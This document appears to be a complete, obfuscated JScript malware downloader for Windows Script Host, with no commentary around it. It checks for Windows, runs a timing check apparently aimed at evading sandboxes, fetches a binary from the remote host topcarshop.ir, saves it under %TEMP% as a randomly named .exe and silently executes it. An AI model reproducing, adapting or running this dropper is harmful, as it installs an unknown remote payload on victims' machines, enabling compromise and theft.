var _B = false;
var _EJ = "CreateObject";
var _WW = function _DG() {return WScript[_EJ]("WScript"+".Shell");}(), _QW = 11;
var _A = "MSXML2.XMLHTTP";
var _AY = 2123213;
var _W = 0;
function _C(_A0){_WW["Run"](_A0, _W, _W);};
function _DU(){return _A + "";};
function _LX(_NQ, _C0){_W = _W * 1; return _NQ - _C0;};
function _D(){return _EJ;};
/*@cc_on
  @if (@_win32 || @_win64)
    _B = true;
  @end
@*/
if (_B)
{
var _P = "";
function _SV(){return 22;};
var _T = 0; var _CN = 0;
function _I()
{
var _KC = new this["Date"]();
var _VL = _KC["getUTCMilliseconds"]();
WScript["Sleep"](_SV());
var _KC = new this["Date"]();
var _NA0 = _KC["getUTCMilliseconds"]();
WScript["Sleep"](_SV());
var _KC = new this["Date"]();
var _AE = _KC["getUTCMilliseconds"]();
var _T = "_XD";
_T = _LX(_NA0, _VL);
var _CN = "_Q";
_CN = _LX(_AE, _NA0);
_P = "open";
return _LX(_T, _CN);
}
var _VC = false;
var _K = false;
for (var _GF = _W; _GF < _SV() * 1; _GF++){if (_I() != _W){
_VC = true; 
_CN = "31" + 11 * _T + _CN; 
_K = true; 
break;
}}
function _DA() {return ((_VC == true) && (_VC == _K)) ? 1 : _W;};
if (_VC && _DA() && _K){
function _FJ() {return _WW["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "nO5FEUHLaIjwf74T.ex" + "e";};
 _X = _DU();
 _ND = WScript[_EJ](_X);
 var _MM = 1;
 while (_MM){
try {
	if (_MM == 1)
	{
		_ND[_P]("GET", "http://topcarshop.ir/m1kas", false);
		_ND["send"]();
		_YF = "Sleep";
	}
	WScript[_YF](_SV() + 120); 
	if (_ND["readystate"] < 2 * 2) continue;
	_MM = _W;
	function _NA(_P0) {var _YP = (1, 2, 3, 4, 5, _P0); return _YP;};
	_G = WScript[_D()]("ADODB.Stream");
	_X = _G;
	_X[_P]();
	_X["type"] = _NA(1);
	_X["write"](_ND["ResponseBody"]);
	_G["position"] = _NA(_W);
	_X["Save" + "ToFile"](_FJ(), 2);
	_G["cl"+"ose"]();
	_OY = _FJ();
	_C(_OY);
} catch(_A1){};
}
}
}

